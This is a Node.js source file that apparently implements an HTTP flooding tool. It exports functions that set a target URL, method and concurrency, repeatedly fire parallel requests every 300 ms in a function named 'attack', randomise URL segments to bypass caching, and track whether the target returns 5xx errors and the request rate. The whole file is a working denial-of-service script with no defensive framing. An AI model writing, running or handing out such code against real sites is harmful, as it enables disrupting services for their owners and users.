const axios = require('axios');

let target,
    method,
    parallel = 4,
    payload,
    active_calls = 0,
    hit = 0,
    not_hit = 0,
    interval = null,
    last_err = null,
    down_with_500 = false,
    startDate

const WAIT_INTERVAL = 300;


function getRandomString() {
    const length = Math.floor(Math.random() * 7) + 3;
    let result = '';
    let characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function getTargetUrl() {
    if (target && target.indexOf('*') >= -1) {
        return target.replace(/\*/g, getRandomString());
    }
    return target;
}

async function attack() {
    const url = getTargetUrl();
    console.log('attacking ', url);
    active_calls++;
    const start = new Date();
    axios[method](url)
        .then(res => {
            hit++;
            try {
                console.log('hit!', res.status, res.statusText, new Date().getTime() - start.getTime() + ' ms');
            } catch (err) {
            }
        })
        .catch(err => {
            not_hit++;

            try {
                console.log('didn\'t hit >_<', err.response.status, err.response.statusText, new Date().getTime() - start.getTime() + ' ms');
                const code = err.response.status;
                down_with_500 = code && code >= 500 && code < 600;
                last_err = err.message;
            } catch (err) {
            }
        })
        .finally(() => {
            active_calls--;
        })

    if (hit > parallel || not_hit > parallel) {
        hit -= hit ? hit - 1 : 0;
        not_hit = not_hit ? not_hit - 1 : 0;
    }
}

const checkWait = function () {
    return active_calls >= parallel
};


module.exports.setStuff = function (a_target, a_parallel = 4, a_method = "get", a_payload = {}) {
    target = a_target
    method = a_method
    parallel = a_parallel
    payload = a_payload
};

function mainLoop() {
    if (!checkWait()) {
        for (let i = 0; i < parallel - active_calls; i++) {
            attack();
        }
    }
}

module.exports.startAttack = function () {
    startDate = new Date();
    interval = setInterval(() => {
        mainLoop()
    }, WAIT_INTERVAL)
}

module.exports.stop = function () {
    if (interval) {
        console.log('stopping interval');
        clearInterval(interval);
        interval = null;
        startDate = null;
    }
}

module.exports.resetState = function () {
    active_calls = 0;
    hit = 0;
    not_hit = 0;
    if (interval) {
        startDate = new Date();
    }else{
        startDate = null;
    }
}

module.exports.getStats = function () {
    let response_rate = 'unknown';
    if (startDate && hit) {
        let min = Math.abs((startDate.getTime() - new Date().getTime()) / 1000 / 60)
        response_rate = (hit / min).toFixed(0) + ' hit/min';
    }
    return {
        target, method, parallel, payload, active_calls,
        success: hit, failure: not_hit, running: Boolean(interval),
        down_with_500,
        response_rate
    };
}